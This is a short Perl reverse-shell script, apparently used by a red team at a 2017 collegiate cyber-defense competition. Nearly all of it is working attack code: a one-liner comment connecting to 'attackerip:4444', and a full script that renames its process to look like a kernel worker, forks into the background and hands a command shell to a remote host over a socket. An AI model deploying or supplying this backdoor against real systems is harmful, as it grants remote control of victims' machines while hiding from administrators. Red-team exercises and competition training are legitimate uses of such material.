# DO NOT RUN THIS SCRIPT ON YOUR SYSTEM
# This is a script deployed by the WRCCDC Red Team during the 2017 Regional Event
#!/usr/bin/env perl 
# one liner: perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;' 
use strict;
use warnings;
use IO::Socket;
use IO::Socket::INET;
$0 = "[kworker/0:2]";

my $num_args = $#ARGV + 1;
if ($num_args != 2) {
    print "\nUsage: $0 ip port\n";
    exit;
}

my $ip = shift;
my $port = shift;

open PIPE, "netstat -ptn |" or die $!;
my @slurp=<PIPE>;
close PIPE;
chomp @slurp;
my @matches=grep /$ip:$port/,@slurp;

if (!@matches) {
  my $p=fork;
  exit,if($p);
  my $c=new IO::Socket::INET(PeerAddr => $ip, PeerPort => $port) or die "Failed to open socket";
  STDIN->fdopen($c, 'r');
  $~->fdopen($c, 'w');
  system$_ while<>;
}

